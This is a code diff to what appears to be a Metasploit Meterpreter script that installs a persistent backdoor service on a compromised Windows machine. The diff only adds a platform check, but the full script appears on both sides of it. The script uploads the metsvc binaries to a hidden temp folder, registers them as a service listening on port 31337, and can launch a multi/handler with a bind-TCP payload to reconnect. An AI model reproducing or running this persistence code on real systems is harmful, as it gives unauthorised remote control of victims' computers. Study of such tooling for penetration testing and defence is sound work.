@@ -36,83 +36,87 @@ rport    = 31337
 install  = false
 autoconn = false
 remove   = false
+if client.platform =~ /win32|win64/
 
-
-#
-# Option parsing
-#
-opts.parse(args) do |opt, idx, val|
-	case opt
-	when "-h"
-		print_line(opts.usage)
-		raise Rex::Script::Completed
-	when "-A"
-		autoconn = true
-	when "-r"
-		remove = true
+	#
+	# Option parsing
+	#
+	opts.parse(args) do |opt, idx, val|
+		case opt
+		when "-h"
+			print_line(opts.usage)
+			raise Rex::Script::Completed
+		when "-A"
+			autoconn = true
+		when "-r"
+			remove = true
+		end
 	end
-end
 
-#
-# Create the persistent VBS
-#
+	#
+	# Create the persistent VBS
+	#
 
-if(not remove)
-	print_status("Creating a meterpreter service on port #{rport}")
+	if(not remove)
+		print_status("Creating a meterpreter service on port #{rport}")
+	else
+		print_status("Removing the existing Meterpreter service")
+	end
+
+	#
+	# Upload to the filesystem
+	#
+
+	tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
+
+	print_status("Creating a temporary installation directory #{tempdir}...")
+	client.fs.dir.mkdir(tempdir)
+
+	%W{ metsrv.dll metsvc-server.exe metsvc.exe }.each do |bin|
+		next if (bin != "metsvc.exe" and remove)
+		print_status(" >> Uploading #{bin}...")
+		fd = client.fs.file.new(tempdir + "\\" + bin, "wb")
+		fd.write(::File.read(File.join(based, bin), ::File.size(::File.join(based, bin))))
+		fd.close
+	end
+
+	#
+	# Execute the agent
+	#
+	if(not remove)
+		print_status("Starting the service...")
+		client.fs.dir.chdir(tempdir)
+		data = m_exec(client, "metsvc.exe install-service")
+		print_line("\t#{data}")
+	else
+		print_status("Stopping the service...")
+		client.fs.dir.chdir(tempdir)
+		data = m_exec(client, "metsvc.exe remove-service")
+		print_line("\t#{data}")
+	end
+
+	if(remove)
+		m_exec(client, "cmd.exe /c del metsvc.exe")
+	end
+
+	#
+	# Setup the multi/handler if requested
+	#
+	if(autoconn)
+		print_status("Trying to connect to the Meterpreter service at #{client.tunnel_peer.split(':')[0]}:#{rport}...")
+		mul = client.framework.exploits.create("multi/handler")
+		mul.datastore['WORKSPACE'] = client.workspace
+		mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
+		mul.datastore['LPORT']   = rport
+		mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
+		mul.datastore['ExitOnSession'] = false
+		mul.exploit_simple(
+			'Payload'        => mul.datastore['PAYLOAD'],
+			'RunAsJob'       => true
+		)
+	end
+
 else
-	print_status("Removing the existing Meterpreter service")
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
-
-#
-# Upload to the filesystem
-#
-
-tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
-
-print_status("Creating a temporary installation directory #{tempdir}...")
-client.fs.dir.mkdir(tempdir)
-
-%W{ metsrv.dll metsvc-server.exe metsvc.exe }.each do |bin|
-	next if (bin != "metsvc.exe" and remove)
-	print_status(" >> Uploading #{bin}...")
-	fd = client.fs.file.new(tempdir + "\\" + bin, "wb")
-	fd.write(::File.read(File.join(based, bin), ::File.size(::File.join(based, bin))))
-	fd.close
-end
-
-#
-# Execute the agent
-#
-if(not remove)
-	print_status("Starting the service...")
-	client.fs.dir.chdir(tempdir)
-	data = m_exec(client, "metsvc.exe install-service")
-	print_line("\t#{data}")
-else
-	print_status("Stopping the service...")
-	client.fs.dir.chdir(tempdir)
-	data = m_exec(client, "metsvc.exe remove-service")
-	print_line("\t#{data}")
-end
-
-if(remove)
-	m_exec(client, "cmd.exe /c del metsvc.exe")
-end
-
-#
-# Setup the multi/handler if requested
-#
-if(autoconn)
-	print_status("Trying to connect to the Meterpreter service at #{client.tunnel_peer.split(':')[0]}:#{rport}...")
-	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['WORKSPACE'] = client.workspace
-	mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
-	mul.datastore['LPORT']   = rport
-	mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
-	mul.datastore['ExitOnSession'] = false
-	mul.exploit_simple(
-		'Payload'        => mul.datastore['PAYLOAD'],
-		'RunAsJob'       => true
-	)
-end
-
